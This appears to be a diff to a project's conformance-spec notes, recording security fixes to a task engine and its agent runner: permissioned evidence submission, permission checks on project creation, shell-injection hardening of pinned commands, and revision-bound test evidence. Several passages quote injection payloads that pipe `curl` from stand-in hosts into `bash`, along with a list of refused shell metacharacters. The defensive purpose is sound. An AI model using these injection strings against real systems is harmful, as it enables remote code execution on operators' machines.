@@ -96,7 +96,7 @@ Where the prose was ambiguous or sources conflicted, the suite **pins one readin
 - **Project is the unit of parallel work** (D-E): name + unique `slug` (derived from name, never silently moved by rename) + `kind` (default `mixed`) + optional `repoPath`/`defaultSpecFolder` + `active|archived`. `getProject` resolves id OR slug; events land on a `project` stream.
 - **The default project is the compatibility floor**: `createFeature` without a project lazily creates/reuses slug `default` — every pre-Wave-2 flow and data dir keeps its exact meaning. Features may carry a `name`.
 - Archived projects refuse NEW features; reads stay open. `listWorkItems({projectId})` (id or slug) spans every feature of the project.
-- `createProject` carries no engine-side permission check — deliberately symmetric with `createFeature` (whose `feature.init` convention is enforced at the ops layer, not pinned in the engine).
+- ~~`createProject` carries no engine-side permission check — deliberately symmetric with `createFeature` (whose `feature.init` convention is enforced at the ops layer, not pinned in the engine).~~ **SUPERSEDED by 0.2b** (below): the premise was false — nothing at any layer enforced it. `createProject`/`createFeature` now require `feature.init`.
 
 ### Phase 7 Wave 2 — externalKey scoping (`external-key-scope.test.ts`)
 - Handles are **scoped per project**: a bare key resolves only while unique across the workspace; duplicated across projects → explicit `GuardFailedError` "ambiguous … qualify as `<project-slug>:<key>`" (never silent cross-project first-writer shadowing). The qualified form always resolves. One resolver serves every command (`mustGetItem`).
@@ -116,3 +116,165 @@ Where the prose was ambiguous or sources conflicted, the suite **pins one readin
 ### Phase 7 Wave 1 — event timestamps (`event-timestamps.test.ts`, additive)
 - Every appended event carries **`occurredAt`: wall-clock ms stamped at append**, monotonically non-decreasing in `globalSeq` order. Pinned with wall-time *bounds* (not clock injection) so the identical suite runs against the memory engine and the worker-thread PGlite facade.
 - `occurredAt` is **observational audit metadata only**: no guard, transition, lease, or entitlement decision may read it — the engine's logical clock (`advanceClock`) stays the only time source for lease logic. Rows persisted before this pin default to `0`.
+
+### 0.2a — who may author machine evidence (`gates-evidence.test.ts`, 7 new pins)
+
+A **spec change**, recorded here per the rule at the top of this file. Before it,
+`submitEvidence` required no permission, no claim and no fencing token, so any actor
+holding any token could append `test_run{exitCode:0}` + `commit{reachableOnRemote:true}`
+to any work item. Because both evidence guards take the **latest** row of each kind,
+appending after the real (failing) measurement was enough to turn the done gate green on
+facts nobody measured — the fake-done the thesis exists to refuse, reachable without the
+dishonest *operator* the documented trust floor assumes. §1.4 named three gate conditions
+but the suite only ever pinned what evidence must **say**, never who may **say** it.
+
+- **`evidence.submit` is required for every kind.** Measuring is an authority. It rides
+  with the roles that measure (`developer`, `product_owner`, `reviewer`, `tech_lead`) and
+  is deliberately absent from `contributor` and `qa` — so the six `provision_personas`
+  agents, whose floor-state role is `contributor` (`[]`), cannot author a verdict.
+- **Verdict-bearing evidence on a live-claimed item must present that claim's fencing
+  token.** Facts about work in flight come only from the worker executing it — the §1.3
+  capability rule for transitions, extended to the facts transitions are judged on.
+- **The fencing rule is narrowed twice, and both narrowings are load-bearing.** Only while
+  a claim is LIVE, because the §9.3 `intent_hash` is submitted at spec approval before any
+  claim exists and the §9.6 `pr` merge fact at review approval after the runner released
+  (it advances to `in_review`, *then* releases). And only for `VERDICT_EVIDENCE_KINDS`
+  (`test_run`, `git_diff`, `commit`, `doc_lint`, `intent_hash`, `pr`), because a reviewer
+  posts a `review_report` while the worker's claim is still live — Phase 4's exit criterion
+  does exactly that. Fencing context evidence would push the reviewer off the rails to say
+  something the engine never reads. **If a kind is ever promoted to a guard it must be
+  added to `VERDICT_EVIDENCE_KINDS` in the same change** — that list is one exported
+  constant both the authz rule and the guard logic read, so the two engines cannot drift.
+- **The `evidence.submitted` event carries the verdict-relevant payload fields**
+  (`pickVerdictFields`, a whitelist), not just `{kind}`. `oahs events` is sold as "who did
+  what, on what evidence — a query, not an interview"; an event carrying only the kind
+  cannot say which command or what exit code won the latest-wins comparison, so the
+  append-only log was not self-sufficient for an audit of a passed gate. A whitelist rather
+  than the whole payload because evidence payloads are free-form and agent-adjacent ones
+  carry transcript tails that have no business in the event log.
+
+Fixture consequence, recorded because it touched 16 files: every conformance fixture whose
+worker submits evidence now grants it explicitly. That is the pin doing its job — the
+grant is visible in each cluster instead of implied.
+
+### 0.2b — the planning surface is permissioned (`project.test.ts`, 4 new pins)
+
+A **spec change that overrides an earlier pin.** The superseded pin (marked above) read:
+"`createProject` carries no engine-side permission check — deliberately symmetric with
+`createFeature` (whose `feature.init` convention is enforced at the ops layer, not pinned
+in the engine)." Its premise does not hold: `apps/spine-api/src/bus.ts` passed `ctx.actorId`
+straight into `createFeature` / `createWorkItem` / `importStories` / `project_create` with no
+`requirePermission` and no `requireAdmin`, so "the ops layer" was a convention nobody
+implemented. A pin may record a deliberate absence; it may not record an enforcement that
+does not exist.
+
+- **`createProject` and `createFeature` require `feature.init`.** The containers are
+  authority, matching what the role bundles already assumed.
+- **`createWorkItem` and `importStories` require `task.plan`** — deliberately the SAME
+  permission that governs `backlog→draft`, so "who may put work into the system" and "who
+  may start moving it" stay one authority rather than two.
+- **Why this outranks an ordinary missing check**: `createWorkItem` is the write path for
+  `invokeDevWith`, which `packages/runner` interpolates into the agent command it executes
+  on an operator machine. An unpermissioned create was therefore an unpermissioned write
+  into a string that runs — the inverse of D13, where the process deciding what runs must
+  never be the unprivileged one. The pinned test carries the actual payload so the
+  regression is legible.
+- **Governance role is NOT a delivery superuser.** `requirePermission` still never consults
+  `governanceRole` (§3 keeps plan × governance × delivery orthogonal). Instead
+  `ensureBootstrapAdminActor` seeds the bootstrap admin with `feature.init` + `task.plan`,
+  because a governance admin can grant itself anything at will — refusing it there would be
+  friction, not a boundary. `tools/oahs-bootstrap.sh` already performed exactly those two
+  grants by hand; this makes the intended state the default. The attack 0.2b closes is a
+  ZERO-GRANT actor token, which is unaffected.
+
+### 0.2c — a pinned command is a command, not a script (`pinned-command-safety.test.ts`, 16 pins)
+
+D7's promise is that "the runner executes only pinned, **allowlisted** commands". The
+allowlist was decorative: the runner took the first whitespace token, checked it, then
+handed the whole original string to `bash -c` — and the list itself contained `sh` and
+`bash`. `pnpm test; curl http://x | bash` passed on the strength of `pnpm`. Holding
+`gate.spec.approve` was therefore equivalent to code execution on every machine that runs
+a claim for that item; in BYO mode that is the operator's own machine, in the process
+holding the push credential and the ssh-agent socket.
+
+- **The constraint lives where the pin is WRITTEN** (`approveGate`, the only place a pin
+  can be set), not only where it is executed. A pin is Rules-layer data that outlives the
+  runner that wrote it, and every surface — HTTP, MCP, CLI — inherits one rule.
+  A rejected pin leaves the spec `draft` with `pinnedVerification` null: no half-approval.
+- **Refused:** `;`  `&`  `|`  `` ` ``  `$`  `<`  `>`  newline. **Allowed:** quotes (a spaced
+  argument is one argument) and parentheses — the latter are inert under argv execution and
+  are required by the repo's own pins (`node -e "…require('fs')…"`). Excluding them costs
+  nothing because `$` and backtick are refused, so `$(…)` and `` `…` `` cannot form, and
+  substitution is the escalation vector parentheses alone do not provide.
+- **`sh` and `bash` are gone from the allowlist**, which now also carries `make`, `go` and
+  `cargo`. `VERIFICATION_ALLOWLIST` is exported from core and the runner imports it, so the
+  write-time check and the execution-time check cannot disagree about what is runnable.
+- **The runner executes argv with `shell: false`** (`splitVerificationArgv`), so the
+  execution half of the injection is gone independently of the data check. It keeps its
+  refusal branch as defence in depth for a pin written into a data dir before this rule.
+- **Composition is the array, not the shell.** `pinnedVerification` is a list, so refusing
+  `&&` removes a second way to express what the data model already expresses — capability
+  for an attacker, none for a PO.
+
+**Consequence for an existing pin:** the Phase 1 runner e2e "a non-allowlisted pinned
+command is refused" asserted RUNNER-level refusal of `curl http://evil`. That state can no
+longer be constructed, because the gate refuses it first. The test now pins the stronger
+behaviour (refused at approval, spec left unapproved) and asserts the runner's guard
+function directly.
+
+### 0.2c — `invoke_dev_with` and `externalKey` are constrained (`stories-import.test.ts`, 4 pins)
+
+Both are interpolated by `packages/runner` into the `--agent-cmd` template it executes, and
+the documented template puts `{INVOKE_WITH}` inside a double-quoted bash string — so
+`invoke_dev_with: '" ; curl http://x | bash ; "'` escaped it and ran on the host. Written
+through `create_work_item` / `import_stories`, i.e. by any `task.plan` holder.
+
+- **`SAFE_SPINE_STRING` in core is the single definition.** The contract enforces it for
+  `create_work_item`; `stories.ts` enforces it for the bulk path, because `import_stories`
+  carries opaque YAML on the wire that zod cannot see. Previously `stories.ts` pattern-checked
+  a story `id` while the contract accepted any string for the same field — two validators
+  disagreeing on one value.
+- **The operator's `--agent-cmd` keeps ordinary shell semantics.** It is the operator's own
+  argv, not spine data; the injection is closed by constraining the untrusted inputs, which
+  leaves the canonical README invocation working. Rewriting the template into argv would
+  break the one documented way to run the product to close a hole the data check already
+  closes.
+
+### 0.2d — a passing test_run is bound to the revision it certifies (`gates-evidence.test.ts`, 3 pins)
+
+The done gate's evidence condition checked that every pinned command exited 0 and that the
+final commit was reachable — but it never compared a REVISION, so it certified "the final
+revision" while having no idea which revision the tests measured. HEAD (`0c7a038`) closed
+half of this by making the RUNNER normalize the worktree to the committed revision before
+verifying, which makes the claim true. This closes the other half: the core now checks that
+it was.
+
+- **When both sides state a revision, they must match.** The latest `commit` evidence's `sha`
+  is the certified revision; every pinned command's latest passing `test_run` must carry the
+  same `revision`. A green run on commit A can no longer certify commit B.
+- **Back-compat is a pin, not an accident.** Evidence is append-only and a data dir outlives
+  the binary that wrote it, so a `test_run` with NO `revision` (pre-0.2d) is judged exactly
+  as before. The comparison applies only when the measuring side actually said what it
+  measured — the engine never invents a fact to check.
+- The runner stamps `revision` on `test_run` and `git_diff` from the same `git rev-parse HEAD`
+  it normalizes to, so the pair is comparable by construction.
+
+### 0.2d — the bus is exhaustive by compiler, and the platform is linted
+
+Not conformance pins, recorded here because both make an existing CLAIM enforceable:
+
+- **`const unwired: never = command`** at the end of the bus switch. The line above it said
+  "keeps the compiler honest"; nothing did. A registry entry with no `case` compiled fine and
+  failed at runtime on a line no test covered. It is now a compile error.
+- **`make lint-oahs`** (wired into `make check`): type-aware ESLint over ~49k LOC that
+  previously had `tsc --noEmit` as its only static gate. Deliberately narrow —
+  `no-floating-promises`, `no-misused-promises`, `await-thenable`, `no-unused-vars`,
+  `no-constant-condition` — because 90 rules at once produce a backlog nobody reads. It found
+  4 dead bindings and 3 stale disable directives; **zero floating promises**, which is a real
+  statement about `packages/runner`.
+- **§0.1 is now a rule, not only a grep.** `no-restricted-imports` over the four spine trees
+  *plus* `apps/spine-api/ui-src` (which the greps cannot see), matched against the compiler's
+  module graph, so it also catches a provider the six grep literals do not name and a
+  transitive reach. Verified to fire, not assumed. The greps stay as a cheap first line; what
+  neither catches is a bare `fetch()` to a provider URL, and the CI comment now says so
+  instead of implying completeness.
